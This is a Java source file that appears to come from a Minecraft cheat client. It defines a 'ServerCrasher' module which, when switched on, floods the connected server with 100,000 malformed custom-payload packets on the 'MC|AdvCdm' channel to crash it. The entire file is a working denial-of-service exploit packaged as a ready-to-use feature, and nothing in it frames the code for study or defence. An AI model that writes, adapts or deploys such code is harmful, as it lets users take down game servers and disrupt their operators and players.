package today.exusiai.modules.collection.exploit;

import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import today.exusiai.modules.AbstractModule;
import today.exusiai.utils.Wrapper;
import io.netty.buffer.Unpooled;

public class ServerCrasher extends AbstractModule {
	
    public ServerCrasher() {
        super("ServerCrasher", 0, AbstractModule.Category.Other);
    }

    @Override
    public void onEnable() {
    	PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
        packetbuffer.writeLong(Long.MAX_VALUE);
        for (int i = 0; i < 100000; ++i) {
            Wrapper.getNetManager().sendPacket(new C17PacketCustomPayload("MC|AdvCdm", packetbuffer));
        }
    }
}
